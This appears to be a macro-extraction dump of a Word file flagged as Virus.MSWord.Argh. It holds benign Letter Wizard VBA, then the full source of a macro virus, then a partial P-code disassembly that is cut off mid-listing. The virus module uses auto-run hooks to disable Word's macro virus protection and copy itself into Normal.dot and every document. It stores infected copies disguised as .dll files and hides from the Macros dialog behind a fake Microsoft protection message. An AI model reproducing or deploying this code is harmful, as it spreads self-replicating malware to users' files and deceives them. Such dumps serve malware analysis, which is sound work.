            WordBasic.DlgUpdateFilePreview
        End If
    End If
    If State = 5 Then
        ParseRetAddress
        If RetAddressLines > 5 Then
            ret = 2
            WordBasic.DlgFocus "textReturnAddress"
            WordBasic.MsgBox kErrMaxLines$, 48
        End If 'retaddress...
    End If 'state = 5
    If State = 6 And item > StateItems__(0) Then
        PickStylePreview
        WordBasic.DlgUpdateFilePreview
    End If
LContinue:
    If item = 7 Then ' FINISH
        If RetAddressLines <= 5 Then
            CreateLetter
            x = WordBasic.DlgValue("HelpOrEnvelope")
            gEnvelopeLabel = (x = 0)
            WordBasic.CurValues.ToolsEnvelopesAndLabels dlgEL
            dlgEL.EnvAddress = WordBasic.[DlgText$]("textRecipientAddress")
            dlgEL.EnvReturn = WordBasic.[DlgText$]("textReturnAddress")
            dlgEL.AddrText = WordBasic.[DlgText$]("textRecipientAddress")
            dlgEL.ExtractAddress = 0
            ret = 1 ' This means "return from wizard now"
        Else
            ret = 2
        End If
    End If
    DoButtonClick = ret
End Function 'DoButtonClick


Private Sub ItemFocusChanged(id$, wold)
    If State = 1 Then
       If WordBasic.[Left$](id$, 5) = "optlm" Then
        WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1" + id$, 1)
       End If
    ElseIf State = 4 Then
       If Mid(id$, 3, 3) = "The" Then
        WordBasic.DlgText "tip5text", WordBasic.[GetAutoText$]("tip5" + id$, 1)
       End If
    End If
End Sub

Private Sub SaveDialog()
    WordBasic.PrintStatusBar kSaveSettings$
    SaveDlgValPref "LetterMethod"
'state 2
    SaveDlgValPref "chkloPage"
    SaveDlgValPref "chkloDate"
    SaveDlgValPref "chkloID"
    SaveDlgValPref "chkloWriterInitials"
    SaveDlgValPref "chkloTypistInitials"
    SaveDlgValPref "chkloCC"
    SaveDlgValPref "chkloEnclosures"
    SaveDlgValPref "chkloAttachments"
'3
    SaveDlgValPref "UseLetterhead"
'4
    SaveDlgValPref "LetterHeadPosition"
    SaveDlgPref "textLetterheadSpace"
'5
    SaveDlgMultiLinePref "textRecipientAddress"
    SaveDlgMultiLinePref "textReturnAddress"
'6
    SaveDlgValPref "WizStyle"
'finish
    SaveDlgValPref "HelpOrEnvelope"
End Sub

Private Sub RstDialog()
Dim a$
Dim unit
Dim kRstStylesheet$
Dim def$
    WordBasic.PrintStatusBar kRstSettings$
    RstDlgValPref "LetterMethod", 0 ' LetterMethod is id #11
    WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1optlm" + WordBasic.[LTrim$](Str(WordBasic.DlgValue(11) + 1)), 1) 'For Prewritten Letters
'state 2
    RstDlgValPref "chkloPage", 1
    RstDlgValPref "chkloDate", 1
    RstDlgValPref "chkloID", 0
    RstDlgValPref "chkloWriterInitials", 0
    RstDlgValPref "chkloTypistInitials", 0
    RstDlgValPref "chkloCC", 0
    RstDlgValPref "chkloEnclosures", 0
    RstDlgValPref "chkloAttachments", 0
'3
    RstDlgValPref "UseLetterhead", 1
'4
    RstDlgValPref "LetterHeadPosition", 0
    gCurrentHeadingPosition = -1
    Select Case WordBasic.DlgValue(StateItems__(4 - 1) + 1) 'LetterHeadPosition
        Case 0
            a$ = "AtTheTop"
        Case 1
            a$ = "OnTheLeft"
        Case 2
            a$ = "OnTheRight"
        Case Else
            WordBasic.MsgBox "Internal error (LHP bad)", wizname$, 16
    End Select
    WordBasic.DlgText "tip5text", WordBasic.[GetAutoText$]("tip5" + a$, 1)
    unit = GetDefaultUnits
    RstDlgPref "textLetterheadSpace", PrettyMeasurement$(ConvertInchesToUnits(2, unit), unit)
'5
    RstDlgMultiLinePref "textRecipientAddress", WordBasic.[GetAutoText$]("prefRecipientAddress", 1)
    RstDlgMultiLinePref "textReturnAddress", toui.Address
'6
    RstDlgValPref "WizStyle", 0
'finish
    RstDlgValPref "HelpOrEnvelope", 1
    PickStylePreview
    If WordBasic.DlgValue("UseLetterhead") = 0 Then UpdateHeadingPosition
    WordBasic.PrintStatusBar kRstStylesheet$
'======================================
    def$ = WordBasic.[GetDocumentVar$]("LetterName")
    If def$ <> "" Then      'oh, goody: Mr. Resume is bossing me around again. Joy, joy.
        WordBasic.PrintStatusBar kLookingFor$ + chQuote$ + def$ + chQuote$ + "..."
        WordBasic.DlgValue "LetterMethod", 0    'prewritten
        WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1optlm" + WordBasic.[LTrim$](Str(WordBasic.DlgValue(11) + 1)), 1) 'For Prewritten Letters
    End If
    WordBasic.PrintStatusBar ""
End Sub

'======================================================
'%% Common Wizard Routines

Private Sub VerifyEnvirons()
Dim wind$
Dim fBadDoc
    Dim howser As Object: Set howser = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
    WordBasic.CurValues.ToolsOptionsGeneral howser
    gDoogie = howser.BlueScreen
    WordBasic.ToolsOptionsGeneral BlueScreen:=0
    WordBasic.ScreenUpdating 0
    WordBasic.DisableInput  'Disable ESCape (works correctly in dialog)
    wind$ = WordBasic.[FileNameFromWindow$]()
    If wind$ <> "" Then fBadDoc = 1
    If WordBasic.IsMacro() Or InStr(wind$, ".") <> 0 Then
         fBadDoc = 1
    Else
        WordBasic.EditSelectAll
        If Len(WordBasic.[Selection$]()) > 1 Then fBadDoc = 1
    End If
    If fBadDoc Then
        WordBasic.MsgBox kErrBadDoc$, kWizname$, 16
        Error 1302
    End If
'After all that, the document may still be bogus (even if we created a new one above!)
    WordBasic.EditSelectAll 'Clear it out
    WordBasic.WW6_EditClear
    workDoc$ = WordBasic.[WindowName$]()    'get name of working doc's window
    WordBasic.DisableAutoMacros 1       'make sure no macros are executed!
    On Error GoTo -1: On Error GoTo FatalError
    WordBasic.FileNewDefault            'create a new, empty window
    WordBasic.DisableAutoMacros 0       're-enable auto macros
'grab page setup options
    Dim dlgPgSetup1 As Object: Set dlgPgSetup1 = WordBasic.DialogRecord.FilePageSetup(False)
    Dim dlgPgSetup2 As Object: Set dlgPgSetup2 = WordBasic.DialogRecord.FilePageSetup(False)
    WordBasic.CurValues.FilePageSetup dlgPgSetup1
    iEmptyDoc = WordBasic.Window()      'get window # of this doc
    emptyDoc$ = WordBasic.[WindowName$]()
    iWorkDoc = 1
    While (WordBasic.[WindowName$](iWorkDoc) <> workDoc$) 'find our original window
        iWorkDoc = iWorkDoc + 1
    Wend
    WordBasic.WindowList (iWorkDoc)     'switch back to working doc
    WordBasic.CurValues.FilePageSetup dlgPgSetup2
    If dlgPgSetup1.Orientation <> dlgPgSetup2.Orientation Then 'need to swap page dimensions
        With ActiveDocument.PageSetup
            .PageWidth = CentimetersToPoints(Val(dlgPgSetup1.PageHeight))
            .PageHeight = CentimetersToPoints(Val(dlgPgSetup1.PageWidth))
        End With
    Else
        With ActiveDocument.PageSetup
            .PageWidth = CentimetersToPoints(Val(dlgPgSetup1.PageWidth))
            .PageHeight = CentimetersToPoints(Val(dlgPgSetup1.PageHeight))
        End With
    End If
    GoTo NoError

FatalError:
    WordBasic.DisableAutoMacros 0
    On Error GoTo -1: On Error GoTo 0

NoError:

End Sub

'=====================================

Private Sub xStorePref(id$, val_$)
Dim v$
    If val_$ = "" Then v$ = "~" Else v$ = val_$
    WordBasic.SetPrivateProfileString kWizname$, id$, v$, Environ("windir") + "\wordwiz.ini"
End Sub

Private Function xFetchPref$(id$)
    xFetchPref$ = WordBasic.[GetPrivateProfileString$](kWizname$, id$, Environ("windir") + "\wordwiz.ini")
End Function

Private Sub SaveDlgValPref(id$)
    xStorePref id$, Str(1 + WordBasic.DlgValue(id$))
End Sub

Private Sub RstDlgValPref(id$, defaultVal)
Dim v
Dim nerr
    v = WordBasic.Val(WordBasic.[GetPrivateProfileString$](kWizname$, id$, "wordwiz.ini")) - 1  'get the value
    If v < 0 Then v = defaultVal    'ensure legal value (unless too big...)
    On Error GoTo -1: On Error GoTo TooBig
    WordBasic.DlgValue id$, v
    GoTo rdvpexit
TooBig:
    nerr = Err.Number
    On Error GoTo -1: On Error GoTo 0
    If nerr = 9 Then    'subscript out of range ... v is too big
        WordBasic.DlgValue id$, defaultVal
    Else
        WordBasic.ScreenUpdating -1 'make sure this is turned on
        Error nerr  'report the err
    End If
rdvpexit:
End Sub

Private Sub SaveDlgPref(id$)
    xStorePref id$, WordBasic.[DlgText$](id$)
End Sub

Private Sub RstDlgPref(id$, defaultStr$)
Dim v$
    v$ = WordBasic.[GetPrivateProfileString$](kWizname$, id$, "wordwiz.ini")
    If v$ = "" Then v$ = defaultStr$
    If v$ = "~" Then v$ = ""
    WordBasic.DlgText id$, v$
End Sub

Private Sub SaveDlgMultiLinePref(id$)
Dim v$
Dim idx
Dim count_
    v$ = WordBasic.[DlgText$](id$)
    idx = InStr(v$, Chr(13))
    count_ = 1
    While (idx > 0)
        xStorePref id$ + WordBasic.[LTrim$](Str(count_)), WordBasic.[Left$](v$, idx - 1)
        If Len(v$) > idx Then v$ = Mid(v$, idx + 1) Else v$ = ""
        idx = InStr(v$, Chr(13))
        count_ = count_ + 1
    Wend
    xStorePref id$ + WordBasic.[LTrim$](Str(count_)), v$
    xStorePref id$ + "Lines", Str(count_)
End Sub

Private Sub RstDlgMultiLinePref(id$, defaultStr$)
Dim count_
Dim v$
Dim f$
    count_ = WordBasic.Val(xFetchPref$(id$ + "Lines"))
    If count_ = 0 Then
        v$ = defaultStr$
    Else
        v$ = xFetchPref$(id$ + WordBasic.[LTrim$](Str(count_)))
        If v$ = "~" Then v$ = ""
        count_ = count_ - 1
        While count_ > 0
            f$ = xFetchPref$(id$ + WordBasic.[LTrim$](Str(count_)))
            If f$ = "~" Then f$ = ""
            v$ = f$ + Chr(13) + v$
            count_ = count_ - 1
        Wend
    End If
    WordBasic.DlgText id$, v$
End Sub

'===

Private Sub ItemsInState(howMany)
    LastState = LastState + 1
    StateItems__(LastState) = howMany + StateItems__(LastState - 1)
End Sub

Private Sub EnableControls() 'Enable/Disable controls
    If State > 1 Then
        WordBasic.DlgEnable 5, 1 '<Back
    End If
    If State < LastState Then
        WordBasic.DlgEnable 6, 1 'Next>
    End If
    If State = 1 Then
        WordBasic.DlgFocus 6 'Next>
        WordBasic.DlgEnable 5, 0 '<Back
    ElseIf State = LastState Then
        WordBasic.DlgFocus 7 'finish
        WordBasic.DlgEnable 6, 0 'Next
    End If
End Sub 'EnableControls


Private Sub SHControls(FirstField, LimField, SH) 'Show/Hide controls
Dim iField
    For iField = FirstField To LimField - 1
        WordBasic.DlgVisible iField, SH
    Next
End Sub 'SHControls

Private Sub EnabFields(FirstField, LimField, ED) 'Enable/Disable controls
Dim iField
    For iField = FirstField To LimField - 1
        WordBasic.DlgEnable iField, ED
    Next
End Sub 'EnabFields

Private Sub ChangeState(sold, snew)
    SHControls (StateItems__(sold - 1)), (StateItems__(sold)), 0
    If HideFilePreview__(snew) - HideFilePreview__(sold) Then
        WordBasic.DlgVisible 8
    End If
    SHControls (StateItems__(snew - 1)), (StateItems__(snew)), 1
    State = snew
    If snew = 2 And WordBasic.DlgValue("LetterMethod") = 1 Then
        WordBasic.DlgVisible "chkloID", 0
        WordBasic.DlgVisible "chkloWriterInitials", 0
        WordBasic.DlgVisible "chkloTypistInitials", 0
        WordBasic.DlgVisible "chkloCC", 0
        WordBasic.DlgVisible "chkloEnclosures", 0
        WordBasic.DlgVisible "chkloAttachments", 0
    End If
    Rem Chk if MAPI environment is present to enable AddressBook buttons
    If snew = 5 Then
        WordBasic.DlgEnable 43, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 44, 0 - WordBasic.CommandValid(kInsertAddress$)
    End If
    EnableControls
End Sub 'ChangeState

'%%%% Wizard Dialog Control Function %%%
Private Function DlgControl(id$, iaction, wvalue)
Dim fRet
Dim idnum
Dim result
    fRet = 1
    Select Case iaction
        Case 1  'Init
            State = 1
            WordBasic.DlgVisible 2 'Hide OK button
            WordBasic.DlgVisible 3 'Hide Hint button (no hints)
            RstDialog   'restore dialog settings
            SHControls (StateItems__(0)), (StateItems__(LastState)), 0 'Hide ALL states
            SHControls (StateItems__(State - 1)), (StateItems__(State)), 1 'Show initial state
            If HideFilePreview__(State) <> 0 Then WordBasic.DlgVisible 8
            EnableControls 'Enable/Disable controls
            WordBasic.DlgFocus 6 'Next>
            fRet = 0
        Case 2  'Click
            idnum = WordBasic.DlgControlId(id$)
            result = DoButtonClick(id$, idnum)
            If result = 0 Then
                Select Case idnum
                Case 4 'Cancel
                    fRet = 0 'exit dialog
                Case 5 '<Back
                    ChangeState State, PrevState(State)
                Case 6 'Next>
                    ChangeState State, NextState(State)
                Case 43 'Address Book To DAPFEL
                    SetAddress (1)
                    WordBasic.DlgFocus 40
                Case 44 'Address Book Return DAPFEL
                    SetAddress (2)
                    WordBasic.DlgFocus 42
                Case Else
                    'not gunna happen
                End Select
            ElseIf result = 1 Then
                SaveDialog 'save settings
                fRet = 0
            End If
        Case 3 'Item contents changed
            ' do nothing
        Case 4 'item focus changed
            ItemFocusChanged id$, wvalue
        Case 5 'idle
            WordBasic.PrintStatusBar "" 'clear status bar
            If WordBasic.Window() = iEmptyDoc Then WordBasic.WindowList (iWorkDoc) 'bring work to front
        Case 6 'updated forced (by moving dialog)
            WordBasic.WindowList (iEmptyDoc)    'bring the empty window to the fore
        Case Else
    End Select
    DlgControl = fRet
End Function 'DlgControl

Private Function StrWizardPath() As String
    Dim strPath As String
    Dim strFileName As String
    Dim i As Integer
    Dim fFound As Boolean

    On Error GoTo FatalError
    
    fFound = True
    strPath = objWizTemplate.path

    If (Len(strPath) = 0) Then
        ' New template based on Wizard
        ' Get location of templates - first look in UserTemplatesPath
        ' and then in Workgroup path
        i = 0
        fFound = False
        strPath = Application.Options.DefaultFilePath(wdUserTemplatesPath)
        
        While ((i < 2) And fFound = False)
            If (Len(strPath) <> 0) Then
                ' First try to find wizard with long filename
                WordBasic.FileFind SearchPath:=strPath, Name:=kWizname$ & strWIZ, SubDir:=1, MatchCase:=0
                If WordBasic.CountFoundFiles() = 0 Then
                    ' Try to find wizard with short filename
                    WordBasic.FileFind SearchPath:=strPath, Name:=strWizShortName & strWIZ, SubDir:=1, MatchCase:=0
                    If WordBasic.CountFoundFiles() <> 0 Then fFound = True
                Else
                    fFound = True
                End If
            End If
        
            i = i + 1
            strPath = Application.Options.DefaultFilePath(wdWorkgroupTemplatesPath)
        Wend
        
        If (fFound) Then ' Wizard was found, so save path
            strFileName = WordBasic.[FoundFileName$](1)
            strPath = WordBasic.[FileNameInfo$](strFileName, 5)
        End If
    End If

    If (fFound) Then
        strPathSeparator = Application.PathSeparator
        If Right$(strPath, 1) <> strPathSeparator Then strPath = strPath & strPathSeparator
        StrWizardPath = strPath
        Exit Function
    End If

LWizardMissing:
    MsgBox strERR_WIZ_NOT_FOUND
    
FatalError:
    ReportError Err
End Function ' StrWizardPath


'main error reporting routine called for fatal errors in the wizard
'SHOULD NOT BE CALLED FOR POST-WIZARD ERRORS
Public Sub ReportError(ByVal ErrorCode As ErrObject)
    Dim lErrorCode As Long
    Dim strErrorMsg As String
    
    lErrorCode = ErrorCode.Number
    strErrorMsg = ErrorCode.Description
    
    'The next statement seems to reset the ErrorCode object,
    'even though it is a ByVal argument
    On Error Resume Next
    
    ResetWizardEnvironment (True)
    
    If fBalloonVisible Then objAssistantBalloon.Close
    If lErrorCode Then DisplayErrorMsg strErrorMsg
    If lAssistantId Then Assistant.EndWizard lAssistantId, False '2nd parameter is fSuccess
    
    If (Not (formWizard Is Nothing)) Then
        formWizard.Hide
        Unload formWizard
        Set formWizard = Nothing
    End If
    
    'ReportError is not called in post-wizard option errors.
    'So, always closing the doc.
    ActiveDocument.Close wdDoNotSaveChanges 'ActiveDocument assumed to be set
    
    'terminate the wizard
    End

End Sub ' ReportError

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Argh - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub infect(m)
Application.DisplayAlerts = wdAlertsNone
d = Assistant.Animation
Assistant.Animation = msoAnimationGetTechy
getnormal (1)
Assistant.Animation = d
End Sub

Sub deletenormal(m)
On Error GoTo e
    Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", NewName:="oldNewMacros", Object:= _
        wdOrganizerObjectProjectItems
e:
End Sub
Sub copymacro(m)
On Error GoTo eco
    Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
eco:
End Sub

Sub replicate(m)
If Int((50 * Rnd) + 1) = 25 Then
   Set a = Assistant.NewBalloon
   a.Heading = "Help me"
   a.Text = "I'm not feeling very vell .. AAARGHH!!!"
   a.Show
   End If
On Error GoTo re
    With ActiveDocument
        .AttachedTemplate = "Normal.dot"
    End With
    Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="NewMacros", _
        Object:=wdOrganizerObjectProjectItems
re:
End Sub
Sub AutoNew()
infect (1)
replicate (1)
runmacro ("AutoNew")
End Sub
Sub AutoClose()
infect (1)
replicate (1)
runmacro ("AutoClose")
End Sub
Sub autoopen()
infect (1)
replicate (1)
runmacro ("autoopen")
End Sub
Sub AutoExit()
infect (1)
replicate (1)
runmacro ("AutoExit")
End Sub
Sub ToolsMacro()
If Documents.Count = 0 Then
n = MsgBox("Microsoft is protecting your normal.dot from virus infection You can only add macros to other documents", vbOKOnly)
Exit Sub
Else
getnormal (1)
restoreoriginal (1)
Dialogs(wdDialogToolsMacro).Show
recopy (1)
End If
End Sub

Sub restoreoriginal(m)
On Error GoTo rr1:
    Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
rr1:
 On Error GoTo rro:
    Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "oldNewMacros", NewName:="NewMacros", Object:= _
        wdOrganizerObjectProjectItems
rro:
End Sub
Sub recopy(m)
On Error GoTo eco
    reren (1)
    Application.OrganizerCopy Source:= _
        Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "wininf.dll", Destination:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
eco:
End Sub
Sub reren(m)
On Error GoTo rre
Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", NewName:="oldNewMacros", Object:= _
        wdOrganizerObjectProjectItems
rre:
End Sub
Sub getnormal(m)
virusflag = System.PrivateProfileString("prncfg.ini", "Printer Port", "PortNumber")
Options.VirusProtection = False
If virusflag = "" Then
   System.PrivateProfileString("prncfg.ini", "Printer Port", "PortNumber") = "340"
   NormalTemplate.OpenAsDocument                                  'save normal.dot to windot.dll
   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "windot.dll"
   ActiveDocument.Close
   deletenormal (1)
   copymacro (1)
   NormalTemplate.OpenAsDocument
   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "wininf.dll" 'save infected dot
   ActiveDocument.Close
End If
End Sub
Sub runmacro(m)
On Error GoTo rme
Application.Run "Normal.oldNewMacros." + m
rme:
End Sub
Sub stealth()
ToolsMacro
MsgBox "stealth"
End
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Argh
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/UC01 - 153576 bytes
' Line #0:
' 	Dim (Private Const) 
' 	LitStr 0x0008 "¨Ã¦C¤å¦r"
' 	VarDefn SZ_MACRONAME
' Line #1:
' Line #2:
' 	FuncDefn (Sub Insert())
' Line #3:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #4:
' 	MemLdWith Then 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Eq 
' 	MemLdWith Then 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Paren 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #5:
' 	LineCont 0x0004 03 00 14 00
' 	LitStr 0x0028 "½Ð¥ý¿ï¨ú­n¨Ã¦Cªº¤å¦r¡A¦A¿ï¨ú¥»¥\¯à¿ï¶µ¡C"
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #6:
' 	GoTo LExit 
' 	BoS 0x0000 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	MemLdWith Start 
' 	MemLdWith End 
' 	Eq 
' 	Paren 
' 	MemLdWith Then 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #9:
' 	ParamOmitted 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith MoveRight 0x0003 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	MemLdWith Then 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #12:
' 	MemLdWith End 
' 	LitDI2 0x0001 
' 	Sub 
' 	MemStWith End 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	MemLdWith Range 
' 	ArgsLd FIsRubyField 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #15:
' 	LineCont 0x0008 1C 00 10 00 38 00 10 00
' 	MemLdWith Range 
' 	MemLd Fields 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	LitDI2 0x0001 
' 	MemLdWith Then 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Or 
' 	LitDI2 0x0001 
' 	MemLdWith Then 
' 	Ld vbTab 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Or 
' 	LitDI2 0x0001 
' 	MemLdWith Then 
' 	LitStr 0x0001 ","
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Or 
' 	LitDI2 0x0001 
' 	MemLdWith Then 
' 	LitStr 0x0001 "("
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Or 
' 	LitDI2 0x0001 
' 	MemLdWith Then 
' 	Ld vbTab 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #16:
' 	LitStr 0x0038 "µLªk¬°§t¦³©w¦ìÂI¡B¥\¯àÅÜ¼Æ©M¬q¸¨²Å¸¹ªº¦r¦ê¥[¤J¨Ã¦Cªºµù¸Ñ"
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #17:
' 	GoTo LExit 
' 	BoS 0x0000 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld Selection 
' 	MemLd Start 
' 	Ld Selection 
' 	MemLd End 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0016 "½Ð¿ï¨ú­n¥[¤Jµù¸Ñªº¦r¦ê"
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #22:
' 	GoTo LExit 
' 	BoS 0x0000 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndWith 
' Line #25:
' 	ArgsCall InitDialog 0x0000 
' Line #26:
' 	Ld dlgRuby 
' 	ArgsMemCall Show 0x0000 
' Line #27:
' 	Label LExit 
' Line #28:
' 	EndSub 
' Line #29:
' Line #30:
' 	FuncDefn (Sub Create(szRuby As String, szFont As String, iSize As Integer, iDist As Integer, szAlign As String))
' Line #31:
' 	Dim 
' 	VarDefn rgn (As Range)
' Line #32:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #33:
' 	Dim 
' 	VarDefn iCurSize (As Integer)
' Line #34:
' 	Dim 
' 	VarDefn szCurFont (As String)
' Line #35:
' 	Dim 
' 	VarDefn fnt (As Font)
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #37:
' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #38:
' Line #39:
' 	OnError LError 
' Line #40:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #41:
' 	SetStmt 
' 	MemLdWith Range 
' 	Set rgn 
' Line #42:
' 	SetStmt 
' 	Ld rgn 
' 	ArgsLd GetCurFont 0x0001 
' 	Set fnt 
' Line #43:
' 	Ld rgn 
' 	ArgsLd FIsRubyField 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #44:
' 	ArgsCall Delete 0x0000 
' Line #45:
' 	EndIfBlock 
' Line #46:
' Line #47:
' 	Ld fnt 
' 	MemLd Size 
' 	St iCurSize 
' Line #48:
' 	Ld fnt 
' 	MemLd New 
' 	St szCurFont 
' Line #49:
' 	MemLdWith Then 
' 	FnLen 
' 	St n 
' Line #50:
' Line #51:
' 	QuoteRem 0x0008 0x000D " Insert Field"
' Line #52:
' 	MemLdWith Range 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitVarSpecial (False)
' 	MemLdWith Fields 
' 	ArgsMemCall Add 0x0004 
' Line #53:
' 	LitStr 0x0005 "eq \o"
' 	ArgsMemCallWith TypeText 0x0001 
' Line #54:
' Line #55:
' 	QuoteRem 0x0008 0x0012 " Ruby string align"
' Line #56:
' 	Ld szAlign 
' 	Paren 
' 	SelectCase 
' Line #57:
' 	LitStr 0x0004 "¾a¥ª"
' 	Case 
' 	CaseDone 
' Line #58:
' 	LitStr 0x0003 "\al"
' 	ArgsMemCallWith TypeText 0x0001 
' Line #59:
' 	LitStr 0x000A "µ¥¶¡¶Z®i¶}"
' 	Case 
' 	CaseDone 
' Line #60:
' 	LitStr 0x0003 "\ad"
' 	ArgsMemCallWith TypeText 0x0001 
' Line #61:
' 	CaseElse 
' Line #62:
' 	EndSelect 
' Line #63:
' Line #64:
' 	LitStr 0x0006 "(\s\up"
' 	Ld iDist 
' 	MemLdWith Font 
' 	MemLd Size 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	FnInt 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #65:
' 	Ld szRuby 
' 	ArgsMemCallWith InsertBefore 0x0001 
' Line #66:
' 	Ld iSize 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #67:
' 	Ld szFont 
' 	MemLdWith Font 
' 	MemSt New 
' Line #68:
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt DisableCharacterSpaceGrid 
' Line #69:
' 	ArgsMemCallWith MoveRight 0x0000 
' Line #70:
' 	LitStr 0x0002 "),"
' 	ArgsMemCallWith InsertAfter 0x0001 
' Line #71:
' 	Ld iCurSize 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #72:
' 	Ld szCurName 
' 	MemLdWith Font 
' 	MemSt New 
' Line #73:
' 	ParamOmitted 
' 	Ld n 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsMemCallWith MoveRight 0x0002 
' Line #74:
' 	LitStr 0x0001 ")"
' 	ArgsMemCallWith TypeText 0x0001 
' Line #75:
' 	QuoteRem 0x0008 0x0031 " Kludge, To remove space char at end of field...."
' Line #76:
' 	ParamOmitted 
' 	LitDI2 0x0002 
' 	ArgsMemCallWith MoveLeft 0x0002 
' Line #77:
' 	Ld wdCharacter 
' 	ParamNamed unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	ArgsMemCallWith Delete 0x0002 
' Line #78:
' Line #79:
' 	MemLdWith Fields 
' 	ArgsMemCall ToggleShowCodes 0x0000 
' Line #80:
' 	ParamOmitted 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith MoveRight 0x0003 
' Line #81:
' Line #82:
' 	EndWith 
' Line #83:
' 	Label LExit 
' Line #84:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #85:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #86:
' 	ExitSub 
' Line #87:
' 	Label LError 
' Line #88:
' 	Ld Err 
' 	MemLd Description 
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #89:
' 	EndSub 
' Line #90:
' Line #91:
' 	FuncDefn (Sub Delete())
' Line #92:
' 	Dim 
' 	VarDefn rgn (As Range)
' Line #93:
' 	Dim 
' 	VarDefn rgnFld (As Range)
' Line #94:
' 	Dim 
' 	VarDefn rgnNew (As Range)
' Line #95:
' 	Dim 
' 	VarDefn szCode (As String)
' Line #96:
' 	Dim 
' 	VarDefn FUpdate (As Boolean)
' Line #97:
' Line #98:
' 	OnError LError 
' Line #99:
' 	Ld Application 
' 	MemLd ScreenUpdating 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #100:
' 	LitVarSpecial (True)
' 	St FUpdate 
' Line #101:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #102:
' 	Ld wdCursorWait 
' 	Ld System 
